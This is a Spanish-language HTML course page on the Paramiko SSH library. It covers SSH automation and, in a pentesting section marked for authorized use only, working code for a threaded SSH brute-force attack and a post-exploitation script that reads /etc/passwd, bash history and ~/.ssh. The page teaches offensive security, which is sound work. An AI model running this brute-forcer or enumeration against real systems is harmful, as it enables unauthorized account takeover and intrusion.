@@ -1,0 +1,786 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sesión 5: Herramientas y Bibliotecas para Ciberseguridad</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-okaidia.min.css" rel="stylesheet" />
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <header>
+        <div>SESIÓN 5: Herramientas y Bibliotecas para Ciberseguridad</div>
+    </header>
+
+    <section class="contenido-didactico">
+        <h1>BLOQUE 2: Paramiko - Conexiones SSH Automatizadas</h1>
+
+        <h2>2.1 Fundamentos de Paramiko</h2>
+
+        <p>
+            <strong>Paramiko</strong> es una biblioteca de Python que implementa el protocolo SSH (Secure Shell), permitiendo automatizar conexiones SSH, ejecutar comandos remotos, transferir archivos mediante SFTP y crear túneles SSH.
+        </p>
+
+        <details>
+            <summary>Instalación</summary>
+            <p>
+                Para instalar Paramiko: <code>pip install paramiko</code>
+            </p>
+        </details>
+
+        <h3>Capacidades de Paramiko</h3>
+
+        <ul>
+            <li>Conexiones SSH automatizadas con autenticación por contraseña o clave</li>
+            <li>Ejecución de comandos remotos</li>
+            <li>Transferencia de archivos mediante SFTP</li>
+            <li>Port forwarding (túneles SSH)</li>
+            <li>Shell interactiva remota</li>
+        </ul>
+
+<pre><code class="language-python">#!/usr/bin/env python3
+"""
+Paramiko: Biblioteca para conexiones SSH en Python
+Permite automatizar conexiones SSH, SFTP, y ejecución remota
+
+INSTALACIÓN:
+pip install paramiko
+"""
+
+import paramiko
+import socket
+import sys
+from getpass import getpass
+
+print("""
+╔═══════════════════════════════════════════════════════════════════╗
+║                    PARAMIKO - CONEXIONES SSH                      ║
+╠═══════════════════════════════════════════════════════════════════╣
+║  Paramiko permite:                                                ║
+║  • Conexiones SSH automatizadas                                   ║
+║  • Ejecución de comandos remotos                                  ║
+║  • Transferencia de archivos (SFTP)                               ║
+║  • Autenticación por contraseña o clave                           ║
+║  • Port forwarding (túneles SSH)                                  ║
+╚═══════════════════════════════════════════════════════════════════╝
+""")
+
+# ========================================
+# CONEXIÓN SSH BÁSICA
+# ========================================
+
+def conexion_ssh_basica(host, usuario, password, puerto=22):
+    """
+    Establece conexión SSH básica con contraseña.
+    """
+    print(f"\n[*] Conectando a {usuario}@{host}:{puerto}")
+    
+    # Crear cliente SSH
+    cliente = paramiko.SSHClient()
+    
+    # Política para hosts desconocidos
+    # AutoAddPolicy: Acepta automáticamente (¡cuidado en producción!)
+    # RejectPolicy: Rechaza hosts desconocidos
+    # WarningPolicy: Advierte pero acepta
+    cliente.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    
+    try:
+        # Conectar
+        cliente.connect(
+            hostname=host,
+            port=puerto,
+            username=usuario,
+            password=password,
+            timeout=10
+        )
+        
+        print(f"[+] Conectado exitosamente")
+        return cliente
+    
+    except paramiko.AuthenticationException:
+        print(f"[-] Error de autenticación")
+        return None
+    except paramiko.SSHException as e:
+        print(f"[-] Error SSH: {e}")
+        return None
+    except socket.timeout:
+        print(f"[-] Timeout de conexión")
+        return None
+    except socket.error as e:
+        print(f"[-] Error de conexión: {e}")
+        return None
+
+
+def conexion_ssh_clave(host, usuario, clave_privada, puerto=22, passphrase=None):
+    """
+    Conexión SSH usando clave privada.
+    """
+    print(f"\n[*] Conectando con clave a {usuario}@{host}:{puerto}")
+    
+    cliente = paramiko.SSHClient()
+    cliente.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    
+    try:
+        # Cargar clave privada
+        if clave_privada.endswith('.pem') or 'RSA' in open(clave_privada).read():
+            key = paramiko.RSAKey.from_private_key_file(clave_privada, password=passphrase)
+        else:
+            # Intentar Ed25519 u otros formatos
+            key = paramiko.Ed25519Key.from_private_key_file(clave_privada, password=passphrase)
+        
+        cliente.connect(
+            hostname=host,
+            port=puerto,
+            username=usuario,
+            pkey=key,
+            timeout=10
+        )
+        
+        print(f"[+] Conectado exitosamente con clave")
+        return cliente
+    
+    except FileNotFoundError:
+        print(f"[-] Archivo de clave no encontrado: {clave_privada}")
+        return None
+    except paramiko.ssh_exception.SSHException as e:
+        print(f"[-] Error SSH: {e}")
+        return None
+
+
+# ========================================
+# EJECUCIÓN DE COMANDOS
+# ========================================
+
+def ejecutar_comando(cliente, comando, timeout=30):
+    """
+    Ejecuta un comando en el servidor remoto.
+    """
+    print(f"\n[*] Ejecutando: {comando}")
+    
+    try:
+        # exec_command retorna: stdin, stdout, stderr
+        stdin, stdout, stderr = cliente.exec_command(comando, timeout=timeout)
+        
+        # Leer salida
+        salida = stdout.read().decode('utf-8')
+        errores = stderr.read().decode('utf-8')
+        codigo_salida = stdout.channel.recv_exit_status()
+        
+        resultado = {
+            'comando': comando,
+            'salida': salida,
+            'errores': errores,
+            'codigo_salida': codigo_salida
+        }
+        
+        if salida:
+            print(f"[+] Salida:\n{salida}")
+        if errores:
+            print(f"[!] Errores:\n{errores}")
+        print(f"[*] Código de salida: {codigo_salida}")
+        
+        return resultado
+    
+    except socket.timeout:
+        print(f"[-] Timeout ejecutando comando")
+        return None
+
+
+def shell_interactivo(cliente):
+    """
+    Abre una shell interactiva SSH.
+    """
+    print("\n[*] Abriendo shell interactiva (escribir 'exit' para salir)")
+    print("-" * 50)
+    
+    try:
+        # Invocar shell
+        canal = cliente.invoke_shell()
+        canal.settimeout(0.5)
+        
+        import select
+        
+        while True:
+            # Verificar si hay datos del servidor
+            ready, _, _ = select.select([canal], [], [], 0.5)
+            if ready:
+                datos = canal.recv(4096).decode('utf-8', errors='ignore')
+                print(datos, end='', flush=True)
+            
+            # Leer entrada del usuario
+            try:
+                comando = input()
+                if comando.lower() == 'exit':
+                    break
+                canal.send(comando + '\n')
+            except EOFError:
+                break
+        
+        canal.close()
+        print("\n[*] Shell cerrada")
+    
+    except Exception as e:
+        print(f"[-] Error: {e}")
+
+
+# ========================================
+# TRANSFERENCIA DE ARCHIVOS (SFTP)
+# ========================================
+
+def subir_archivo(cliente, local, remoto):
+    """
+    Sube un archivo al servidor remoto usando SFTP.
+    """
+    print(f"\n[*] Subiendo {local} -> {remoto}")
+    
+    try:
+        sftp = cliente.open_sftp()
+        sftp.put(local, remoto)
+        sftp.close()
+        
+        print(f"[+] Archivo subido exitosamente")
+        return True
+    
+    except FileNotFoundError:
+        print(f"[-] Archivo local no encontrado: {local}")
+        return False
+    except IOError as e:
+        print(f"[-] Error de escritura remota: {e}")
+        return False
+
+
+def descargar_archivo(cliente, remoto, local):
+    """
+    Descarga un archivo del servidor remoto.
+    """
+    print(f"\n[*] Descargando {remoto} -> {local}")
+    
+    try:
+        sftp = cliente.open_sftp()
+        sftp.get(remoto, local)
+        sftp.close()
+        
+        print(f"[+] Archivo descargado exitosamente")
+        return True
+    
+    except IOError as e:
+        print(f"[-] Error: {e}")
+        return False
+
+
+def listar_directorio(cliente, ruta='/'):
+    """
+    Lista archivos en un directorio remoto.
+    """
+    print(f"\n[*] Listando: {ruta}")
+    
+    try:
+        sftp = cliente.open_sftp()
+        archivos = sftp.listdir_attr(ruta)
+        
+        print(f"{'PERMISOS':<12} {'TAMAÑO':<12} {'NOMBRE'}")
+        print(f"  {'-'*55}")
+        
+        for archivo in archivos:
+            # Convertir permisos a formato legible
+            modo = oct(archivo.st_mode)[-3:]
+            tamano = archivo.st_size
+            nombre = archivo.filename
+            
+            print(f"  {modo:<12} {tamano:<12} {nombre}")
+        
+        sftp.close()
+        return archivos
+    
+    except IOError as e:
+        print(f"[-] Error: {e}")
+        return []
+
+
+# ========================================
+# SSH TUNNELING (PORT FORWARDING)
+# ========================================
+
+def crear_tunel_local(cliente, puerto_local, host_destino, puerto_destino):
+    """
+    Crea un túnel SSH local.
+    Permite acceder a host_destino:puerto_destino a través de localhost:puerto_local
+    
+    Equivalente a: ssh -L puerto_local:host_destino:puerto_destino
+    """
+    print(f"\n[*] Creando túnel local")
+    print(f"    localhost:{puerto_local} -> {host_destino}:{puerto_destino}")
+    
+    try:
+        transport = cliente.get_transport()
+        
+        # Crear canal de túnel
+        canal = transport.open_channel(
+            "direct-tcpip",
+            (host_destino, puerto_destino),
+            ("127.0.0.1", puerto_local)
+        )
+        
+        print(f"[+] Túnel establecido")
+        return canal
+    
+    except Exception as e:
+        print(f"[-] Error creando túnel: {e}")
+        return None
+
+
+# ========================================
+# CLASE SSH MANAGER
+# ========================================
+
+class SSHManager:
+    """
+    Gestor de conexiones SSH con funcionalidades extendidas.
+    """
+    
+    def __init__(self, host, usuario, password=None, clave=None, puerto=22):
+        self.host = host
+        self.usuario = usuario
+        self.password = password
+        self.clave = clave
+        self.puerto = puerto
+        self.cliente = None
+    
+    def conectar(self):
+        """Establece conexión SSH."""
+        self.cliente = paramiko.SSHClient()
+        self.cliente.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        
+        try:
+            if self.clave:
+                key = paramiko.RSAKey.from_private_key_file(self.clave)
+                self.cliente.connect(
+                    self.host, self.puerto, self.usuario, pkey=key
+                )
+            else:
+                self.cliente.connect(
+                    self.host, self.puerto, self.usuario, self.password
+                )
+            return True
+        except Exception as e:
+            print(f"Error: {e}")
+            return False
+    
+    def ejecutar(self, comando):
+        """Ejecuta comando y retorna salida."""
+        if not self.cliente:
+            return None
+        
+        _, stdout, stderr = self.cliente.exec_command(comando)
+        return {
+            'stdout': stdout.read().decode(),
+            'stderr': stderr.read().decode(),
+            'exit_code': stdout.channel.recv_exit_status()
+        }
+    
+    def subir(self, local, remoto):
+        """Sube archivo."""
+        sftp = self.cliente.open_sftp()
+        sftp.put(local, remoto)
+        sftp.close()
+    
+    def descargar(self, remoto, local):
+        """Descarga archivo."""
+        sftp = self.cliente.open_sftp()
+        sftp.get(remoto, local)
+        sftp.close()
+    
+    def cerrar(self):
+        """Cierra conexión."""
+        if self.cliente:
+            self.cliente.close()
+    
+    def __enter__(self):
+        self.conectar()
+        return self
+    
+    def __exit__(self, *args):
+        self.cerrar()
+
+
+# ========================================
+# EJEMPLO DE USO
+# ========================================
+
+if __name__ == "__main__":
+    print("=== DEMO PARAMIKO ===\n")
+    
+    # Ejemplo de uso (requiere servidor SSH accesible)
+    print("Ejemplo de código:")
+    print("""
+    # Conexión básica
+    ssh = SSHManager('192.168.1.100', 'usuario', password='secreto')
+    if ssh.conectar():
+        resultado = ssh.ejecutar('uname -a')
+        print(resultado['stdout'])
+        ssh.cerrar()
+    
+    # Con context manager
+    with SSHManager('servidor', 'user', password='pass') as ssh:
+        print(ssh.ejecutar('whoami')['stdout'])
+        ssh.subir('archivo_local.txt', '/tmp/archivo.txt')
+    """)
+    
+    # Si quieres probar con un servidor real:
+    # host = input("Host: ")
+    # usuario = input("Usuario: ")
+    # password = getpass("Password: ")
+    # 
+    # cliente = conexion_ssh_basica(host, usuario, password)
+    # if cliente:
+    #     ejecutar_comando(cliente, "uname -a")
+    #     ejecutar_comando(cliente, "whoami")
+    #     cliente.close()</code></pre>
+
+        <h2>2.2 Herramientas SSH para Pentesting</h2>
+
+        <div class="advertencia">
+            <p><strong>⚠️ ADVERTENCIA:</strong> Las herramientas de esta sección deben usarse <strong>únicamente con autorización explícita</strong> en sistemas propios o con permiso del propietario.</p>
+        </div>
+
+<pre><code class="language-python">#!/usr/bin/env python3
+"""
+Herramientas SSH para pentesting con Paramiko
+"""
+
+import paramiko
+import socket
+import threading
+import queue
+import time
+from concurrent.futures import ThreadPoolExecutor
+
+# ========================================
+# SSH BRUTE FORCE
+# ========================================
+
+class SSHBruteForce:
+    """
+    Herramienta de fuerza bruta SSH.
+    ¡SOLO USAR EN SISTEMAS PROPIOS O CON AUTORIZACIÓN!
+    """
+    
+    def __init__(self, host, puerto=22, timeout=5, hilos=5):
+        self.host = host
+        self.puerto = puerto
+        self.timeout = timeout
+        self.hilos = hilos
+        self.encontrado = False
+        self.lock = threading.Lock()
+    
+    def probar_credencial(self, usuario, password):
+        """Intenta autenticación con credenciales."""
+        if self.encontrado:
+            return None
+        
+        cliente = paramiko.SSHClient()
+        cliente.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        
+        try:
+            cliente.connect(
+                self.host,
+                port=self.puerto,
+                username=usuario,
+                password=password,
+                timeout=self.timeout,
+                banner_timeout=self.timeout,
+                auth_timeout=self.timeout,
+                allow_agent=False,
+                look_for_keys=False
+            )
+            
+            cliente.close()
+            
+            with self.lock:
+                self.encontrado = True
+                return (usuario, password)
+        
+        except paramiko.AuthenticationException:
+            return None
+        except (socket.error, paramiko.SSHException):
+            return None
+        except Exception:
+            return None
+    
+    def atacar(self, usuarios, passwords):
+        """
+        Ejecuta ataque de fuerza bruta.
+        
+        usuarios: lista de usuarios o archivo
+        passwords: lista de contraseñas o archivo
+        """
+        print(f"\n[*] SSH Brute Force a {self.host}:{self.puerto}")
+        print(f"[*] Usuarios: {len(usuarios)}")
+        print(f"[*] Passwords: {len(passwords)}")
+        print(f"[*] Combinaciones: {len(usuarios) * len(passwords)}")
+        print("-" * 50)
+        
+        # Generar combinaciones
+        combinaciones = [(u, p) for u in usuarios for p in passwords]
+        
+        inicio = time.time()
+        intentos = 0
+        
+        with ThreadPoolExecutor(max_workers=self.hilos) as executor:
+            futuros = []
+            
+            for usuario, password in combinaciones:
+                if self.encontrado:
+                    break
+                
+                futuro = executor.submit(self.probar_credencial, usuario, password)
+                futuros.append(futuro)
+            
+            for futuro in futuros:
+                resultado = futuro.result()
+                intentos += 1
+                
+                if resultado:
+                    print(f"\n[+] ¡CREDENCIALES ENCONTRADAS!")
+                    print(f"    Usuario: {resultado[0]}")
+                    print(f"    Password: {resultado[1]}")
+                    return resultado
+                
+                if intentos % 10 == 0:
+                    print(f"\r[*] Intentos: {intentos}/{len(combinaciones)}", end="")
+        
+        duracion = time.time() - inicio
+        print(f"\n\n[-] No se encontraron credenciales válidas")
+        print(f"[*] Tiempo: {duracion:.2f}s")
+        print(f"[*] Velocidad: {intentos/duracion:.1f} intentos/s")
+        
+        return None
+
+
+# ========================================
+# SSH BANNER GRABBING
+# ========================================
+
+def ssh_banner(host, puerto=22, timeout=5):
+    """
+    Obtiene banner SSH para identificar versión.
+    """
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(timeout)
+        sock.connect((host, puerto))
+        
+        banner = sock.recv(1024).decode('utf-8').strip()
+        sock.close()
+        
+        info = {
+            'banner': banner,
+            'version_protocolo': None,
+            'software': None,
+            'os_hint': None
+        }
+        
+        # Parsear banner SSH-x.x-software
+        if banner.startswith('SSH-'):
+            partes = banner.split('-')
+            if len(partes) >= 3:
+                info['version_protocolo'] = partes[1]
+                info['software'] = '-'.join(partes[2:])
+                
+                # Detectar posible OS
+                banner_lower = banner.lower()
+                if 'ubuntu' in banner_lower:
+                    info['os_hint'] = 'Ubuntu Linux'
+                elif 'debian' in banner_lower:
+                    info['os_hint'] = 'Debian Linux'
+                elif 'openssh' in banner_lower:
+                    info['os_hint'] = 'Unix/Linux (OpenSSH)'
+                elif 'dropbear' in banner_lower:
+                    info['os_hint'] = 'Embedded Linux (Dropbear)'
+        
+        return info
+    
+    except Exception as e:
+        return {'error': str(e)}
+
+
+# ========================================
+# SSH AUDIT
+# ========================================
+
+def ssh_audit(host, puerto=22):
+    """
+    Audita configuración SSH.
+    Verifica algoritmos y configuraciones inseguras.
+    """
+    print(f"\n[*] Auditando SSH en {host}:{puerto}")
+    print("-" * 50)
+    
+    # Obtener banner
+    banner_info = ssh_banner(host, puerto)
+    if 'error' in banner_info:
+        print(f"[-] Error: {banner_info['error']}")
+        return None
+    
+    print(f"[+] Banner: {banner_info['banner']}")
+    if banner_info.get('os_hint'):
+        print(f"[+] OS probable: {banner_info['os_hint']}")
+    
+    # Crear transport para obtener algoritmos
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(10)
+        sock.connect((host, puerto))
+        
+        transport = paramiko.Transport(sock)
+        transport.start_client()
+        
+        # Obtener algoritmos negociados
+        security_options = transport.get_security_options()
+        
+        resultado = {
+            'banner': banner_info,
+            'kex_algorithms': list(security_options.kex),
+            'ciphers': list(security_options.ciphers),
+            'digests': list(security_options.digests),
+            'key_types': list(security_options.key_types),
+            'vulnerabilidades': []
+        }
+        
+        # Verificar algoritmos inseguros
+        kex_inseguros = ['diffie-hellman-group1-sha1', 'diffie-hellman-group-exchange-sha1']
+        cifrados_inseguros = ['3des-cbc', 'arcfour', 'arcfour128', 'arcfour256', 'blowfish-cbc']
+        macs_inseguros = ['hmac-md5', 'hmac-md5-96', 'hmac-sha1-96']
+        
+        for kex in resultado['kex_algorithms']:
+            if kex in kex_inseguros:
+                resultado['vulnerabilidades'].append(f"KEX inseguro: {kex}")
+        
+        for cipher in resultado['ciphers']:
+            if cipher in cifrados_inseguros:
+                resultado['vulnerabilidades'].append(f"Cifrado inseguro: {cipher}")
+        
+        for mac in resultado['digests']:
+            if mac in macs_inseguros:
+                resultado['vulnerabilidades'].append(f"MAC inseguro: {mac}")
+        
+        # Imprimir resultados
+        print(f"\n[*] Algoritmos de intercambio de claves:")
+        for kex in resultado['kex_algorithms'][:5]:
+            estado = "⚠️ INSEGURO" if kex in kex_inseguros else "✓"
+            print(f"    {estado} {kex}")
+        
+        print(f"\n[*] Cifrados:")
+        for cipher in resultado['ciphers'][:5]:
+            estado = "⚠️ INSEGURO" if cipher in cifrados_inseguros else "✓"
+            print(f"    {estado} {cipher}")
+        
+        if resultado['vulnerabilidades']:
+            print(f"\n[!] Vulnerabilidades encontradas:")
+            for vuln in resultado['vulnerabilidades']:
+                print(f"    - {vuln}")
+        else:
+            print(f"\n[+] No se encontraron algoritmos inseguros")
+        
+        transport.close()
+        return resultado
+    
+    except Exception as e:
+        print(f"[-] Error: {e}")
+        return None
+
+
+# ========================================
+# ENUMERACIÓN POST-EXPLOTACIÓN
+# ========================================
+
+def enumerar_sistema(cliente):
+    """
+    Enumera información del sistema tras obtener acceso SSH.
+    """
+    print("\n[*] Enumeración del sistema")
+    print("=" * 50)
+    
+    comandos = {
+        'Sistema': 'uname -a',
+        'Hostname': 'hostname',
+        'Usuario actual': 'whoami',
+        'ID': 'id',
+        'Usuarios del sistema': 'cat /etc/passwd | cut -d: -f1 | head -20',
+        'Grupos': 'groups',
+        'Sudo': 'sudo -l 2>/dev/null || echo "Sin acceso sudo"',
+        'Red - Interfaces': 'ip addr 2>/dev/null || ifconfig',
+        'Red - Conexiones': 'netstat -tulpn 2>/dev/null | head -20',
+        'Procesos': 'ps aux | head -20',
+        'Crontabs': 'crontab -l 2>/dev/null || echo "Sin crontab"',
+        'SUID binarios': 'find / -perm -4000 2>/dev/null | head -10',
+        'Archivos escribibles': 'find /etc -writable 2>/dev/null | head -10',
+        'Variables de entorno': 'env | head -15',
+        'Historial bash': 'cat ~/.bash_history 2>/dev/null | tail -20',
+        'SSH keys': 'ls -la ~/.ssh/ 2>/dev/null',
+    }
+    
+    resultados = {}
+    
+    for nombre, comando in comandos.items():
+        try:
+            _, stdout, stderr = cliente.exec_command(comando, timeout=10)
+            salida = stdout.read().decode('utf-8').strip()
+            
+            if salida:
+                resultados[nombre] = salida
+                print(f"\n[+] {nombre}:")
+                # Limitar salida
+                lineas = salida.split('\n')[:10]
+                for linea in lineas:
+                    print(f"    {linea[:80]}")
+                if len(salida.split('\n')) > 10:
+                    print(f"    ... ({len(salida.split(chr(10)))} líneas total)")
+        except Exception as e:
+            pass
+    
+    return resultados
+
+
+# ========================================
+# EJEMPLO DE USO
+# ========================================
+
+if __name__ == "__main__":
+    print("""
+╔═══════════════════════════════════════════════════════════════════╗
+║              HERRAMIENTAS SSH PARA PENTESTING                     ║
+╠═══════════════════════════════════════════════════════════════════╣
+║      ADVERTENCIA: Solo usar con autorización explícita            ║
+╚═══════════════════════════════════════════════════════════════════╝
+""")
+    
+    # Demo de banner grabbing (no requiere credenciales)
+    print("\n=== Demo: SSH Banner Grabbing ===")
+    
+    hosts_prueba = ['localhost', 'github.com']
+    
+    for host in hosts_prueba:
+        print(f"\n[*] Probando {host}...")
+        info = ssh_banner(host, timeout=3)
+        if 'error' not in info:
+            print(f"    Banner: {info['banner']}")
+            if info.get('software'):
+                print(f"    Software: {info['software']}")
+        else:
+            print(f"    Error: {info['error']}")
+    
+    print("\n" + "="*50)
+    print("Funciones disponibles:")
+    print("  - ssh_banner(host): Obtener versión SSH")
+    print("  - ssh_audit(host): Auditar configuración")
+    print("  - SSHBruteForce: Fuerza bruta (con autorización)")
+    print("  - enumerar_sistema(cliente): Post-explotación")</code></pre>
+    </section>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/autoloader/prism-autoloader.min.js"></script>
+    <script src="script.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js"></script>
+</body>
+</html>                    
